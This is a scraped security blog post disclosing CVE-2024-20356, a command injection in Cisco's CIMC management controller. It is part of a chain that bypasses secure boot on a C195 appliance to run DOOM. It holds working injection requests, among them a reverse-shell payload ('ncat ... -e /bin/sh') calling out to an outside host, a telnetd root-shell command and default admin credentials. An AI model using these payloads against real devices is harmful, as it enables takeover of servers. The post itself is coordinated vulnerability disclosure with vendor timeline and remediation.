{"aid": "40079085", "title": "CVE-2024-20356: Jailbreaking a Cisco appliance to run DOOM", "url": "https://labs.nettitude.com/blog/cve-2024-20356-jailbreaking-a-cisco-appliance-to-run-doom/", "domain": "nettitude.com", "votes": 1, "user": "todsacerdoti", "posted_at": "2024-04-18 18:14:42", "comments": 0, "source_title": "CVE-2024-20356: Jailbreaking a Cisco appliance to run DOOM", "source_text": "CVE-2024-20356: Jailbreaking a Cisco appliance to run DOOM - LRQA Nettitude\nLabs\n\nSkip to content\n\nMastodon\n\n  * ## PoshC2\n\n### LRQA Nettitude Command & Control Framework - Free and Open Source\n\nDownload\n\n  * ## Vulnerability Research\n\n### Regular vulnerability disclosures\n\nCVEs\n\n  * ## Red Team Training\n\n### Learn to be the best, from the best\n\nSign up\n\n  1. 1\n  2. 2\n  3. 3\n\n# CVE-2024-20356: Jailbreaking a Cisco appliance to run DOOM\n\nBy Aaron Thacker|2024-04-18T16:04:18+00:00April 18, 2024|\n\nThe Cisco C195 is a Cisco Email Security Appliance device. Its role is to act\nas an SMTP gateway on your network perimeter. This device (and the full range\nof appliance devices) is heavily locked down and prevents unauthorised code\nfrom running.\n\nSource: https://www.melbourneglobal.com.au/cisco-esa-c195-k9-esa-c195-email/\n\nI recently took one of these apart in order to repurpose it as a general\nserver. After reading online about the device, a number of people mentioned\nthat it is impossible to bypass secure boot in order to run other operating\nsystems, as this is prevented by design for security reasons.\n\nIn this adventure, the Cisco C195 device family was jailbroken in order to run\nunintended code. This includes the discovery of a vulnerability in the CIMC\nbody management controller which affects a range of different devices, whereby\nan authenticated high privilege user can obtain underlying root access to the\nserver\u2019s BMC (CVE-2024-20356) which in itself has high-level access to various\nother components in the system. The end goal was to run DOOM \u2013 if a smart\nfridge can do it, why not Cisco?\n\nWe have released a full toolkit for detecting and exploiting this\nvulnerability, which can be found on GitHub below:\n\nGitHub: https://github.com/nettitude/CVE-2024-20356\n\nUsage of the toolkit is demonstrated later in this article.\n\n## BIOS Hacking\n\nUnder the hood, the Cisco C195 device is a C220 M5 server. This device is used\nthroughout a large number of different appliances. The initial product is\nadapted to suit the needs of the target appliance. This in itself is a common\ntechnique and valid way of creating a large line of products from a known\nstrong design. While this does have its advantages, it means any faults in the\nunderlying design, supporting hardware or software are apparent on multiple\ndevice types.\n\nThe C195 is a 1U appliance that is designed to handle emails. It runs custom\nCisco software provided by two disks in the device. I wanted to use the device\nfor another purpose, but could not due to the restrictions in place preventing\nthe device from booting unauthorised software. This is a good security feature\nfor products, but does restrict how they can be used.\n\nFrom first glance at the exterior, there was no obvious branding to indicate\nthis was a Cisco UCS C220 M5. Upon taking off the lid, a few labels indicated\nthe true identity of the server. Furthermore, a cover on the back of the\ndevice, when unscrewed, revealed a VGA port. A number of other ports were\npresent on the back, such as Console (Cisco Serial) and RPC (CIMC). The RPC\nport was connected to a network, but the device did not respond.\n\nStarting up the device displayed a Cisco branded AMI BIOS. The configuration\nitself was locked down and a number of configuration options were disabled.\nThe device implemented a strong secure boot setup whereby only Cisco approved\nESA/Cisco Appliance EFI files could be executed.\n\nI could go into great detail here on what was tried, but to cut a long story\nshort, I couldn\u2019t see, modify or run much.\n\nThe BIOS was the first target in this attack chain. I was interested to see\nhow different BIOS versions affect the operation of the device. New features\noften come with new attack surfaces, which pose potential new vectors to\nexplore.\n\nThe device was running an outdated BIOS version. Some tools provided to update\nthe BIOS were not allowed to run due to the locked down secure boot\nconfiguration. A number of different BIOS versions were tried and tested by\nremoving the flash chip, upgrading the BIOS and placing the chip back on the\nboard. To make this process easier, I created a DIY socket on the motherboard\nand a small mount for the chip to easily reflash the device on the fly. This\nwas especially important when continuously reading/observing what kind of data\nis written back to the flash, and how it is stored.\n\nNote there are three chips in total \u2013 the bottom green flash is used for\nCIMC/BMC, the middle marked with red is the main BIOS flash and the top one\n(slightly out of frame) is the backup BIOS flash.\n\nThe CH431A is a very powerful, cost effective device which acts as a multitool\nfor IoT hacking (with the 3.3v modification). Its core is designed to act as a\nSPI programmer but also has a UART interface. In short, you can hook onto or\nremove SPI-compatible flash chips from the target PCB and use the programmer\nto interact with the device. You can make a full 1:1 backup of that chip so if\nanything goes wrong you can restore the original state. On top of that, you\ncan also tamper with or write to the chip.\n\nThe below screenshot shows reading the middle flash chip using flashrom and\nthe CH341A. If following along, it\u2019s important to make a copy of the firmware\nbelow, maybe two, maybe three \u2013 keep these safe and store original versions\nwith MD5 hashes.\n\nUEFITool is a nice way to visualise different parts of a modern UEFI BIOS. It\nprovides a breakdown of different sections and what they do. In recent\nversions, the ability to view Intel BootGuard protected areas are marked which\nis especially important when attacking UEFI implementations.\n\nOn the topic of tampering with the BIOS, why can\u2019t we just replace the BIOS\nwith a version that does not have secure boot enabled, has keys allowing us to\nboot other EFI files, or a backdoor allowing us to boot our own code? Intel\nBootGuard. This isn\u2019t well known but is a really neat feature of Intel-based\nproducts. Effectively it is secure-boot for the BIOS itself. Public keys are\nburned into CPUs using onboard fuses. These public keys can be used to\nvalidate the firmware being loaded. There\u2019s quite a lot to Intel BootGuard,\nbut in the interest of keeping this article short(ish), for now all you need\nto know is it\u2019s a hardware-based root of trust, which means you can\u2019t directly\nmodify parts of the firmware. Note, it doesn\u2019t include the entire flash chip\nas this is also used for user configuration/storage, which can\u2019t be easily\nsigned.\n\nThe latest firmware ISO was obtained and the BIOS .cap file was extracted.\n\nThe .cap file contained a header of 2048 bytes with important information\nabout the firmware. This would be read by the built-in tools to update the\nBIOS, ensuring everything is correct. After removing the header, it needs to\nbe decompressed with bzip2.\n\nThe update BIOS image contains the information that would be placed in the\nBIOS region. Note, we can\u2019t directly flash the bios.cap file onto the flash\nchip as there are important sections missing, such as the Intel ME section.\n\nThe .cap file itself has another header of 0x10D8 (4312) which can be removed\nwith a hex editor or DD.\n\nThe update file and the original BIOS should look somewhat similar at the\nbeginning. However, the update file is missing important sections.\n\nTo only update what was in the BIOS region, we can copy the update file from\n0x1000000 (16777216) onwards into the flash file at the same location. DD can\nbe used for this by taking the first half of the flash, the second half of the\nupdate, and merging them together.\n\nThe original firmware should match in size to our new updated firmware.\n\nJust to be safe, we can check with UEFITool to make sure nothing went majorly\nwrong. The screenshot below shows everything looks fine, and the UUIDs for the\nnew volumes in the BIOS region have been updated.\n\nIn the same way the flash dump was obtained, the updated image can be placed\nback.\n\nWith the BIOS updated to the latest version, a few new features are available.\nThe BIOS screen now presents the option to configure CIMC! Result! Alas, we\nstill cannot make meaningful configuration changes, disable secure boot, or\nboot our own code.\n\nIn the meantime, we found CIMC was configured with a static IP of 0.0.0.0.\nThis would explain why we couldn\u2019t interact with it earlier. A new IP address\nwas set, and we have a new attack surface to explore.\n\nCIMC, Cisco Integrated Management Console, is a small ASPEED-Pilot-4-based\nonboard body-management-controller (BMC). This is a lights-out controller for\nthe device so can be used as a KVM and power management solution. In this\nimplementation, it\u2019s used to handle core system functions such as power\nmanagement, fan control, etc.\n\nCIMC in itself comes with a default username of \u201cadmin\u201d and a default password\nof \u201ccisco\u201d. CIMC can either be on a dedicated interface or share the onboard\nNICs. CIMC has full control over the BIOS, peripheral chips, onboard CPU and a\nnumber of other systems running on the C195/C220.\n\nAt this point the user is free to update CIMC to the latest version and make\nconfiguration changes. It was not possible to disable the secure boot process\nor run any other code aside from the signed Cisco Appliance operating system.\nEven though we had the option to configure secure boot keys, these did not\ntake effect nor did any critical configuration changes. CIMC recognised on the\ndashboard that it was a C195 device.\n\nAt this stage, it is possible to update CIMC to other versions using the\nupdate/flash tool.\n\n## CVE-2024-20356: Command Injection\n\nThe ISO containing the BIOS updates also contained a copy of the CIMC\nfirmware.\n\nThis firmware, alongside the BIOS, is fairly generic for the base model C220\ndevice. It is designed to identify the model of the device and put appropriate\naccommodations in place, such as locking down certain features or making new\nfunctions available. This saves time in production as one good firmware build\ncan be used against a range of devices without major problems.\n\nAs this firmware is designed to accommodate many device types, we observe a\nfew interesting files and features along the way.\n\nThe cimc.bin file located in /firmware/cimc/ contains a wealth of information.\n\nThe binwalk tool can be used to explore this information. At a high level,\nbinwalk will look for patterns in files to identify locations of potential\nembedded files, file systems or data. It can also be extracted using this\ntool. The below screenshot shows a common embedded uBoot Linux system that\nuses a compressed squashfs filesystem to hold the root filesystem.\n\nWhile looking through these filesystems, a few interesting files were\ndiscovered. The library located at /usr/local/lib/appweb/liboshandler.so was\nused to handle requests to the web server. This file contained debug symbols,\nmaking it easier to understand the class structure and what functions are used\nfor. The library was decompiled using Ghidra.\n\nThe ExpFwUpdateUtilityThread function, part of ExpUpdateAgent, was found to be\naffected by a command injection vulnerability. The user-submitted input is\nvalidated, however, certain characters were allowed which can be used to\nexecute commands outside of the intended application scope.\n\nPlain text\n\nCopy to clipboard\n\nOpen code in new window\n\nEnlighterJS 3 Syntax Highlighter\n\n/* ExpFwUpdateUtilityThread(void*) */\n\nvoid * ExpFwUpdateUtilityThread(void *param_1)\n\n{\n\nint iVar1;\n\nProcessingException *pPVar2;\n\nundefined4 uVar3;\n\nchar *pcVar4;\n\nbool bVar5;\n\nundefined auStack192 [92];\n\nbasic_string<char,std::char_traits<char>,std::allocator<char>> abStack100\n[24];\n\n/* ExpFwUpdateUtilityThread(void*) */ void * ExpFwUpdateUtilityThread(void\n*param_1) { int iVar1; ProcessingException *pPVar2; undefined4 uVar3; char\n*pcVar4; bool bVar5; undefined auStack192 [92];\nbasic_string<char,std::char_traits<char>,std::allocator<char>> abStack100\n[24];\n\n    \n    \n    /* ExpFwUpdateUtilityThread(void*) */ void * ExpFwUpdateUtilityThread(void *param_1) { int iVar1; ProcessingException *pPVar2; undefined4 uVar3; char *pcVar4; bool bVar5; undefined auStack192 [92]; basic_string<char,std::char_traits<char>,std::allocator<char>> abStack100 [24];\n\nThe ExpFwUpdateUtilityThread function is called from an API request to\nexpRemoteFwUpdate. This takes four parameters, and appears to provide the\nability to update the firmware for SAS Controllers or Drives. The path\nparameter is validated against a list of known good characters, which includes\n$, ( and ). The function performs string formatting with user data against the\nfollowing string: curl -o %s %s://%s/%s %s. Upon successfully validating the\nuser-supplied data, the formatted string is passed into system_secure(), which\nperforms additional validation, however still allows characters which can be\nused to inject commands through substitution.\n\nPlain text\n\nCopy to clipboard\n\nOpen code in new window\n\nEnlighterJS 3 Syntax Highlighter\n\n/* ExpFwUpdateUtilityThread(void*) */\n\nif (local_24 == 0) {\n\niVar1 = strcmp(var_param_type,\"tftp\");\n\nif ((iVar1 == 0) || (iVar1 = strcmp(var_param_type,\"http\"), iVar1 == 0)) {\n\nmemset(&DAT_001a3798,0,0x200);\n\nsnprintf(&DAT_001a3798,0x200,\"curl -o %s %s://%s/%s\n%s\",\"/tmp/fwimage.bin\",var_param_type,\n\nvar_host,var_path,local_48);\n\niVar1 = system_check_user_input(var_host,\"general_rule\");\n\nif ((iVar1 == 0) ||\n\n((iVar1 = system_check_user_input(var_param_type,\"general_rule\"), iVar1 == 0\n||\n\n(iVar1 = system_check_user_input(var_path,\"general_rule\"), iVar1 == 0)))) {\n\nbVar5 = true;\n\n}\n\nelse {\n\nbVar5 = false;\n\n}\n\nif (bVar5) {\n\npPVar2 = (ProcessingException *)__cxa_allocate_exception(0xc);\n\nProcessingException::ProcessingException(pPVar2,\"Parameters are invalid\");\n\n/* WARNING: Subroutine does not return */\n\n__cxa_throw(pPVar2,&ProcessingException::typeinfo,ProcessingException::~ProcessingException);\n\n}\n\nset_status(1,\"DOWNLOADING\",'\\0',local_2c,local_28);\n\nsystem_secure(&DAT_001a3798);\n\n}\n\n/* ExpFwUpdateUtilityThread(void*) */ if (local_24 == 0) { iVar1 =\nstrcmp(var_param_type,\"tftp\"); if ((iVar1 == 0) || (iVar1 =\nstrcmp(var_param_type,\"http\"), iVar1 == 0)) { memset(&DAT_001a3798,0,0x200);\nsnprintf(&DAT_001a3798,0x200,\"curl -o %s %s://%s/%s\n%s\",\"/tmp/fwimage.bin\",var_param_type, var_host,var_path,local_48); iVar1 =\nsystem_check_user_input(var_host,\"general_rule\"); if ((iVar1 == 0) || ((iVar1\n= system_check_user_input(var_param_type,\"general_rule\"), iVar1 == 0 || (iVar1\n= system_check_user_input(var_path,\"general_rule\"), iVar1 == 0)))) { bVar5 =\ntrue; } else { bVar5 = false; } if (bVar5) { pPVar2 = (ProcessingException\n*)__cxa_allocate_exception(0xc);\nProcessingException::ProcessingException(pPVar2,\"Parameters are invalid\"); /*\nWARNING: Subroutine does not return */\n__cxa_throw(pPVar2,&ProcessingException::typeinfo,ProcessingException::~ProcessingException);\n} set_status(1,\"DOWNLOADING\",'\\0',local_2c,local_28);\nsystem_secure(&DAT_001a3798); }\n\n    \n    \n    /* ExpFwUpdateUtilityThread(void*) */ if (local_24 == 0) { iVar1 = strcmp(var_param_type,\"tftp\"); if ((iVar1 == 0) || (iVar1 = strcmp(var_param_type,\"http\"), iVar1 == 0)) { memset(&DAT_001a3798,0,0x200); snprintf(&DAT_001a3798,0x200,\"curl -o %s %s://%s/%s %s\",\"/tmp/fwimage.bin\",var_param_type, var_host,var_path,local_48); iVar1 = system_check_user_input(var_host,\"general_rule\"); if ((iVar1 == 0) || ((iVar1 = system_check_user_input(var_param_type,\"general_rule\"), iVar1 == 0 || (iVar1 = system_check_user_input(var_path,\"general_rule\"), iVar1 == 0)))) { bVar5 = true; } else { bVar5 = false; } if (bVar5) { pPVar2 = (ProcessingException *)__cxa_allocate_exception(0xc); ProcessingException::ProcessingException(pPVar2,\"Parameters are invalid\"); /* WARNING: Subroutine does not return */ __cxa_throw(pPVar2,&ProcessingException::typeinfo,ProcessingException::~ProcessingException); } set_status(1,\"DOWNLOADING\",'\\0',local_2c,local_28); system_secure(&DAT_001a3798); }\n\nThe following function is called to check the input against a list of allowed\ncharacters.\n\nPlain text\n\nCopy to clipboard\n\nOpen code in new window\n\nEnlighterJS 3 Syntax Highlighter\n\nundefined4 system_check_user_input(undefined4 param_1,char *param_2)\n\n{\n\nint iVar1;\n\nchar *local_1c;\n\nundefined4 local_18;\n\nchar *local_14;\n\nundefined4 local_10;\n\nundefined4 local_c;x\n\nlocal_c = 0xffffffff;\n\niVar1 = strcmp(param_2,\"password_rule\");\n\nif (iVar1 == 0) {\n\nlocal_1c =\n\n\"\n!\\\"#$&\\'()*+,-./0123456789:;=>@ABCDEFGHIJKLMNOPQRSTUVWXYZ\\\\\\\\_abcdefghijklmnopqrstuvwxyz{|}\";\n\nlocal_18 = 0x57;\n\nlocal_c = FUN_000d8120(param_1,&local_1c);\n\n}\n\nundefined4 system_check_user_input(undefined4 param_1,char *param_2) { int\niVar1; char *local_1c; undefined4 local_18; char *local_14; undefined4\nlocal_10; undefined4 local_c;x local_c = 0xffffffff; iVar1 =\nstrcmp(param_2,\"password_rule\"); if (iVar1 == 0) { local_1c = \"\n!\\\"#$&\\'()*+,-./0123456789:;=>@ABCDEFGHIJKLMNOPQRSTUVWXYZ\\\\\\\\_abcdefghijklmnopqrstuvwxyz{|}\";\nlocal_18 = 0x57; local_c = FUN_000d8120(param_1,&local_1c); }\n\n    \n    \n    undefined4 system_check_user_input(undefined4 param_1,char *param_2) { int iVar1; char *local_1c; undefined4 local_18; char *local_14; undefined4 local_10; undefined4 local_c;x local_c = 0xffffffff; iVar1 = strcmp(param_2,\"password_rule\"); if (iVar1 == 0) { local_1c = \" !\\\"#$&\\'()*+,-./0123456789:;=>@ABCDEFGHIJKLMNOPQRSTUVWXYZ\\\\_abcdefghijklmnopqrstuvwxyz{|}\"; local_18 = 0x57; local_c = FUN_000d8120(param_1,&local_1c); }\n\nAlthough the ExpFwUpdateUtilityThread function performs some checks on the\nuser input, additional checks are performed with another list of allowed\ncharacters.\n\nPlain text\n\nCopy to clipboard\n\nOpen code in new window\n\nEnlighterJS 3 Syntax Highlighter\n\nundefined4 system_secure(undefined4 param_1)\n\n{\n\nundefined4 uVar1;\n\nchar *local_10;\n\nundefined4 local_c;\n\nlocal_10 =\n\n\"\n!\\\"#$&\\'()*+,-./0123456789:;=>@ABCDEFGHIJKLMNOPQRSTUVWXYZ\\\\\\\\_abcdefghijklmnopqrstuvwxyz{|}\";\n\nlocal_c = 0x57;\n\nuVar1 = system_secure_ex(param_1,&local_10);\n\nreturn uVar1;\n\n}\n\nundefined4 system_secure(undefined4 param_1) { undefined4 uVar1; char\n*local_10; undefined4 local_c; local_10 = \"\n!\\\"#$&\\'()*+,-./0123456789:;=>@ABCDEFGHIJKLMNOPQRSTUVWXYZ\\\\\\\\_abcdefghijklmnopqrstuvwxyz{|}\";\nlocal_c = 0x57; uVar1 = system_secure_ex(param_1,&local_10); return uVar1; }\n\n    \n    \n    undefined4 system_secure(undefined4 param_1) { undefined4 uVar1; char *local_10; undefined4 local_c; local_10 = \" !\\\"#$&\\'()*+,-./0123456789:;=>@ABCDEFGHIJKLMNOPQRSTUVWXYZ\\\\_abcdefghijklmnopqrstuvwxyz{|}\"; local_c = 0x57; uVar1 = system_secure_ex(param_1,&local_10); return uVar1; }\n\nThe system_secure function calls system_secure_ex, which after passing\nvalidation executes the provided command with system().\n\nPlain text\n\nCopy to clipboard\n\nOpen code in new window\n\nEnlighterJS 3 Syntax Highlighter\n\nint system_secure_ex(char *param_1,undefined4 param_2)\n\n{\n\nint iVar1;\n\nint local_c;\n\nlocal_c = -1;\n\niVar1 = FUN_000d8120(param_1,param_2);\n\nif (iVar1 == 1) {\n\nlocal_c = system(param_1);\n\n}\n\nelse {\n\nsyslog(3,\"%s:%d:ERR: The given command is not secured to run with\nsystem()\\n\",\"systemsecure.c \",\n\n0x98);\n\n}\n\nreturn local_c;\n\n}\n\nint system_secure_ex(char *param_1,undefined4 param_2) { int iVar1; int\nlocal_c; local_c = -1; iVar1 = FUN_000d8120(param_1,param_2); if (iVar1 == 1)\n{ local_c = system(param_1); } else { syslog(3,\"%s:%d:ERR: The given command\nis not secured to run with system()\\n\",\"systemsecure.c \", 0x98); } return\nlocal_c; }\n\n    \n    \n    int system_secure_ex(char *param_1,undefined4 param_2) { int iVar1; int local_c; local_c = -1; iVar1 = FUN_000d8120(param_1,param_2); if (iVar1 == 1) { local_c = system(param_1); } else { syslog(3,\"%s:%d:ERR: The given command is not secured to run with system()\\n\",\"systemsecure.c \", 0x98); } return local_c; }\n\nWe can take the knowledge learnt from the above library and apply it in an\nattempt to exploit the issue. This can be achieved by using $(echo $USER) in\norder to substitute the text for the current username. The function itself is\ndesigned to make a curl request to download firmware updates from a third-\nparty using curl. We can use this functionality to exfiltrate our executed\ncommand.\n\nThe following query can be used to demonstrate command injection:\n\nset=expRemoteFwUpdate(\"1\", \"http\",\"192.168.0.96\",\"/$(echo $USER)\")\n\nThis can be placed in a POST request to https://CIMC/data with an\nadministrator\u2019s sessionCookie and sessionID.\n\nPlain text\n\nCopy to clipboard\n\nOpen code in new window\n\nEnlighterJS 3 Syntax Highlighter\n\nPOST /data HTTP/1.1\n\nHost: 192.168.0.102\n\nCookie: sessionCookie=ef4eb2e3b0[REDACTED]\n\nContent-Length: 189\n\nContent-Type: application/x-www-form-urlencoded\n\nReferer: https://192.168.0.102/index.html\n\nsessionID=2132002102bb[REDACTED]&queryString=set%253dexpRemoteFwUpdate(%25221%2522%252c%2520%2522http%2522%252c%2522192.168.0.96%2522%252c%2522%252f%2524(echo%2520%2524USER)%2522)\n\nPOST /data HTTP/1.1 Host: 192.168.0.102 Cookie:\nsessionCookie=ef4eb2e3b0[REDACTED] Content-Length: 189 Content-Type:\napplication/x-www-form-urlencoded Referer: https://192.168.0.102/index.html\nsessionID=2132002102bb[REDACTED]&queryString=set%253dexpRemoteFwUpdate(%25221%2522%252c%2520%2522http%2522%252c%2522192.168.0.96%2522%252c%2522%252f%2524(echo%2520%2524USER)%2522)\n\n    \n    \n    POST /data HTTP/1.1 Host: 192.168.0.102 Cookie: sessionCookie=ef4eb2e3b0[REDACTED] Content-Length: 189 Content-Type: application/x-www-form-urlencoded Referer: https://192.168.0.102/index.html sessionID=2132002102bb[REDACTED]&queryString=set%253dexpRemoteFwUpdate(%25221%2522%252c%2520%2522http%2522%252c%2522192.168.0.96%2522%252c%2522%252f%2524(echo%2520%2524USER)%2522)\n\nThis is shown in the screenshot below.\n\nWhen the request is made, the command output is received by the attacker\u2019s web\nserver.\n\nHaving underlying system access to the Cisco Integrated Management Console\nposes a significant risk through the breakdown of confidentiality, integrity\nand availability. With this level of access, a threat actor is able to read,\nmodify and overwrite information on the running system, given that CIMC has a\nhigh level of access throughout the device. Furthermore, as underlying access\nis granted to the firmware itself, this poses an integral risk whereby an\nattacker could introduce a backdoor into the firmware and prevent users from\ndiscovering that the device has been compromised. Finally, availability may be\naffected if the firmware is modified, as it could be corrupted to prevent the\ndevice from booting without a recovery method.\n\nThis can be taken a step further to get a full reverse shell from the BMC\nusing the following query string:\n\nset=expRemoteFwUpdate(\"1\", \"http\",\"192.168.0.96\",\"/$(ncat 192.168.0.96 1337 -e\n/bin/sh)\")\n\nIn a full request, this would encode to:\n\nPlain text\n\nCopy to clipboard\n\nOpen code in new window\n\nEnlighterJS 3 Syntax Highlighter\n\nPOST /data HTTP/1.1\n\nHost: 192.168.0.102\n\nCookie: sessionCookie=05f0b903b0[REDACTED]\n\nContent-Length: 228\n\nContent-Type: application/x-www-form-urlencoded\n\nReferer: https://192.168.0.102/index.html\n\nsessionID=1e310e110fb[REDACTED]&queryString=set%253dexpRemoteFwUpdate(%25221%2522%252c%2520%2522http%2522%252c%2522192.168.0.96%2522%252c%2522%252f%2524(ncat%2520192.168.0.96%25201337%2520-e%2520%252fbin%252fsh)%2522)\n\nPOST /data HTTP/1.1 Host: 192.168.0.102 Cookie:\nsessionCookie=05f0b903b0[REDACTED] Content-Length: 228 Content-Type:\napplication/x-www-form-urlencoded Referer: https://192.168.0.102/index.html\nsessionID=1e310e110fb[REDACTED]&queryString=set%253dexpRemoteFwUpdate(%25221%2522%252c%2520%2522http%2522%252c%2522192.168.0.96%2522%252c%2522%252f%2524(ncat%2520192.168.0.96%25201337%2520-e%2520%252fbin%252fsh)%2522)\n\n    \n    \n    POST /data HTTP/1.1 Host: 192.168.0.102 Cookie: sessionCookie=05f0b903b0[REDACTED] Content-Length: 228 Content-Type: application/x-www-form-urlencoded Referer: https://192.168.0.102/index.html sessionID=1e310e110fb[REDACTED]&queryString=set%253dexpRemoteFwUpdate(%25221%2522%252c%2520%2522http%2522%252c%2522192.168.0.96%2522%252c%2522%252f%2524(ncat%2520192.168.0.96%25201337%2520-e%2520%252fbin%252fsh)%2522)\n\nThis is shown in the screenshot below.\n\nA full root shell on the underlying BMC is then received on port 1337. The\nfollowing screenshot demonstrates this by identifying the current user,\nversion and CPU type.\n\nNote: To obtain the sessionCookie and sessionID, the user must login as an\nadministrator using the default credentials of admin and password. The\nsessionCookie can be taken from the response headers and the sessionID can be\ntaken from the response body under <sidValue>.\n\nSo, we have the ability to execute commands on CIMC. The next step involves\nautomating this process to make it easier to reach our goal of running DOOM.\n\nAs it stands, the command injection vulnerability is blind. You need to\nleverage the underlying curl command to exfiltrate data. This is fine for\nsmall outputs but breaks when the URL limit is hit, or if unusual characters\nare included.\n\nAnother method to exfiltrate information was identified through writing a file\nto the web root with a specific filename in order to match the regex inside\nthe nginx configuration.\n\nThe following section in the configuration is used to only serve certain files\nin the web root directory. This includes common documents such as index.html,\n401.html, 403.html etc. The filename \u201cin.html\u201d matches this regex and is not\ncurrently used.\n\nThe toolkit uses this to obtain command output. Command output is written to\n/usr/local/www/in.html.\n\n## CVE-2024-20356: Exploit Toolkit\n\nTo automate this process I created a tool called CISCown which allows you to\ntest for the vulnerability, exploit the vulnerability, and even open up a\ntelnetd root shell service.\n\nThe exploit kit takes a few parameters:\n\n  * -t TARGET\n  * -u USERNAME\n  * -p PASSWORD\n  * -v VERBOSE (obtains more information about CIMC)\n  * -a ACTION\n\n    * \u201ctest\u201d tries to exploit command injection by echoing a random number to \u201cin.html\u201d and reading it\n    * \u201ccmd\u201d executes a command (default if -c is provided)\n    * \u201cshell\u201d executes \u201cbusybox telnetd -l /bin/sh -p 23\u201d\n    * \u201cdance\u201d puts on a light show\n  * -c CMD\n\nThe toolkit can be found on GitHub below:\n\nGitHub: https://github.com/nettitude/CVE-2024-20356\n\nA few examples of the tool\u2019s usage are shown below.\n\nTesting for the vulnerability:\n\nExploiting the vulnerability with id command:\n\nExploiting the vulnerability with cat /proc/cpuinfo to check the CPU in use:\n\nExploiting the vulnerability to gain a full telnet shell:\n\nExploiting the vulnerability to dance (yes, this is in the toolkit):\n\n## Compromising The Secure Boot Chain\n\nWe have root access on the BMC but we still cannot run our own code on the\nmain server. Even after modifying a few settings in the BIOS and on the web\nCIMC administration page, it was not possible to run EFI files not signed with\nthe Cisco Appliance keys.\n\nThe boot menu below only contains one boot device, the EFI shell.\n\nIf a USB stick is plugged in, the device throws a Secure Boot Violation\nwarning and reverts back to the EFI shell.\n\nIt\u2019s not even possible to use the EFI shell to boot EFI files not signed by\nCisco.\n\nThe option to disable secure boot was still greyed out.\n\nIn general, secure boot is based around four key databases:\n\n  * db \u2013 Signatures Database \u2013 Database of allowed signatures\n  * dbx \u2013 Forbidden Signatures Database \u2013 Database of revoked signatures\n  * kek \u2013 Key Exchange Key \u2013 Keys used to sign db and dbx\n  * pk \u2013 Platform Key \u2013 Top level key in secure boot\n\nThe device itself only contains db keys for authorised Cisco appliance\napplications/EFI files. This means restrictions are in place to restrict what\nthe device can boot/load, including EFI modules. Some research was performed\ninto how the device handles secure boot and the chain of trust.\n\nIn order to compromise the secure boot chain, we need to find a way to either\ndisable secure boot or use our own key databases. The UEFI spec states that\nvendors can store these keys in multiple locations, such as in the BIOS flash\nitself, TPM, or externally.\n\nWhile looking around CIMC and the BMC, an interesting script was discovered\nwhich is executed on start-up. The intent behind this script is to prepare the\nBIOS with the appropriate secure boot databases and settings.\n\nThe script defines a number of hardcoded locations for different profiles\nsupported by CIMC.\n\nWhen the script runs, the device gets the current PID value. In our case it\nwas C195, being the model of the device. Note, the below script first attempts\nto fetch this from /tmp/pid_validated, and if it can\u2019t find this file it will\nread the PID from the platform management\u2019s FRU. This will display C195, which\nis then saved in /tmp/pid_validated.\n\nThe script will then go through and check the PID against all supported\nprofiles.\n\nIt does this for every type of profile defined at the top of the script. These\nprofiles contain all of the secure boot key databases such as PK, KEK, DB and\nDBX.\n\nThe check takes the PID of C195 and passes it to is_stbu_rel, which has a\nsmall regex pattern to determine what the device is. If it matches, a number\nof variables are configured and update_pers_data is called to set the secure\nboot profile to use. The profile is what the BIOS then uses as a keystore for\nsecure boot.\n\nThe chain of trust here is as follows:\n\n  * FRU -> BMC with the PID values\n  * BMC -> BIOS with the secure boot keys\n\nAs we have compromised the BMC, we can intercept or modify this process with\nour own PID or keys. By creating or overwriting the /tmp/pid_validated file,\nwe can trick bios_secure_vars_setup.sh into thinking the device is something\nelse and provide a different set of keys.\n\nThe following example demonstrates changing the device to the ND-NODE-L4\nprofile which supports a broader range of allowed EFI modules and vendors.\n\nNOTE: BACKUP THE BIOS AT THIS POINT!\n\nFirst shut down the device and ensure you have made a backup of the BIOS. This\nis an important step, as modifying secure boot keys which do not authorise\ncore components to run can prevent the device from booting (essentially\nbricking it).\n\nThe PID is as follows: C195.\n\nThe /tmp/pid_validated file was overwritten with a new PID of ND-NODE-L4.\n\nThe bios_secure_vars_setup.sh script was run again to reinitialise the secure\nboot environment.\n\nThe device can then be powered back on. Upon turning on the device, a number\nof other boot devices were available from the Ethernet Controllers. This is a\ngood sign, as it means more EFI modules were loaded.\n\nThe boot device manager or EFI shell can be used to boot into an external\ndrive containing an operating system that supports UEFI. In my case, I was\nusing a USB stick plugged into the back of the device.\n\nInstead of an access denied error, bootx64.efi was loaded successfully and\nUbuntu started, demonstrating we now have non-standard code running on the\nCisco C195 Email Appliance.\n\nFinally to complete the main goal:\n\nIn conclusion, it\u2019s possible to follow this attack chain to repurpose a Cisco\nappliance device to run DOOM. The full chain incorporated:\n\n  * Modifying the BIOS to expose CIMC to the network.\n  * Attacking the CIMC management system over the network via remote command execution vulnerability (CVE-2024-20356) to gain root access to a critical component in the system.\n  * Finally, compromising the secure boot chain by modifying the device PID to use other secure boot keys.\n\nTo address this vulnerability, it\u2019s best to adhere to the following advice to\nreduce the likelihood and impact of exploitation:\n\n  * Change the default credentials and uphold a strong password policy.\n  * Update the device to a version which patches CVE-2024-20356.\n\n## Disclosure\n\nWhile it may seem cool to run DOOM on a Cisco Appliance device, the\nvulnerability exploited does pose a threat to the confidentiality, integrity\nand availability of data stored and processed on the server. The issue in\nitself could be used to backdoor the machine and run unauthorised code,\nespecially impactful given that the body management controller has a high\nlevel of access throughout the device.\n\nThe product tested in this writeup was C195/C220 M5 - CIMC 4.2(3e). However,\nas the firmware is used across a range of different devices, this\nvulnerability would affect a range of different products. The full affected\nlist can be found on Cisco\u2019s website below:\n\nhttps://sec.cloudapps.cisco.com/security/center/content/CiscoSecurityAdvisory/cisco-\nsa-cimc-cmd-inj-bLuPcb\n\nCisco was initially informed of the issue on 06 December 2023 and began triage\non 07 December 2023. The Cisco PSIRT responded within 24 hours of initial\ncontact and promptly began working on fixes. A public disclosure date was\nagreed upon for 17 April 2024, and CVE-2024-20356 was assigned by the vendor\nwith a severity rating of High (CVSS score of 8.7). I would like to thank Todd\nReid, Amber Hurst, Mick Buchanan, and Marco Cassini from Cisco for\ncollaborating with us to resolve the issue.\n\n#### Share This Story, Choose Your Platform!\n\nFacebookTwitterRedditLinkedInWhatsAppTumblrPinterestVkXingEmail\n\n## Related Posts\n\n# Projects\n\nCheck out our latest projects at https://github.com/nettitude\n\n  * McAfee File Lock Driver \u2013 Kernel Memory Leak\n\nJanuary 26, 2016\n\n  * Introducing MalSCCM\n\nMay 4, 2022\n\n  * How to Exfiltrate AWS 